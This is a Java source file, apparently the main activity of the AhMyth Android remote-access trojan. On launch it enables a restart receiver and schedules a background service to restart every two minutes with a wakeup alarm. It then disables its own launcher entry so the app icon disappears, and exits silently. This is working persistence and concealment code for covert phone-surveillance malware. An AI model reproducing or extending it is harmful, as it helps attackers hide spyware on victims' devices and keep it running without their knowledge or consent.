package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Bundle;
import android.os.SystemClock;
import android.util.Log;
import android.view.View;
import android.widget.Toast;



public class MainActivity extends Activity {



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main);

        ComponentName receiver = new ComponentName(this, restartReceiver.class);
        PackageManager pm = this.getPackageManager();

        pm.setComponentEnabledSetting(
                receiver,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
        );

        //Intent i = new Intent(this, MainService.class);
        //ComponentName service = this.startService(i);


        /**Intent startService = new Intent(getApplicationContext(),MainService.class);
        PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(),1,startService,PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.ELAPSED_REALTIME,(10*1000),pendingIntent);*/


        Intent myIntent = new Intent(this, MainService.class);
        PendingIntent pendingIntent = PendingIntent.getService(this,0,myIntent,0);
        AlarmManager manager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);

        manager.setInexactRepeating
                (
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime(),
                        2*60*1000,
                        pendingIntent
                );


        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        //startService(new Intent(this, MainService.class));
        finish();
    }






}
